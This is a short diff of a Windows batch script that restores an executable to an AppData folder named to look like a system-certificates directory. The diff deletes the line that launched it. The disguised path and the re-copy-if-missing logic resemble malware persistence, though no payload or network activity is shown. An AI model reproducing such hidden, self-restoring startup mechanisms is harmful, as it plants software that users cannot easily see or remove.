@@ -98,7 +98,6 @@ set "startupFile=%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskC
 if not exist "%startupFile%" (
     echo File not found in Startup folder. Restoring...
     copy "%sourceFile%" "%startupFile%"
-    start "" "%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe"
 ) else (
     echo File is already in Startup folder.
 )
